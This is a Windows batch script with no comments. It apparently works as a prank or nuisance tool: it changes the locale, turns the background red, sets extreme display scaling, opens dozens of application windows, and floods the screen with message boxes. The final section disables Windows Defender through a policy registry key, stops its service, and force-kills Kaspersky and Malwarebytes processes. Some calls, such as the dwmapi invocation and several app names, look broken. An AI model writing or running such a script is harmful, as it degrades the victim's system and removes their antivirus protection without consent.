@echo off

::
control intl.cpl,, /f:"Japanese_Japan.1033"

::
reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v "Background" /t REG_SZ /d "255 0 0" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True, 0

::
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d 480 /f

::
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "Display1_Dpi" /t REG_DWORD /d 600 /f
RUNDLL32.EXE dwmapi.dll,DwmSetComposition

::
for /l %%i in (1,1,20) do (
    start calc.exe
    start notepad.exe
    start mspaint.exe
    start explorer.exe
    start msedge.exe
    start windowsstore.exe
    start xboxapp.exe
    start photos.exe
    start music.exe
    start video.exe
)

::
for /l %%i in (1,1,30) do (
    msg * "Nice"
)

::
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
net stop windefend

::
taskkill /im avp.exe /f
taskkill /im kaspersky.exe /f

::
taskkill /im mbam.exe /f
taskkill /im malwarebytes.exe /f

pause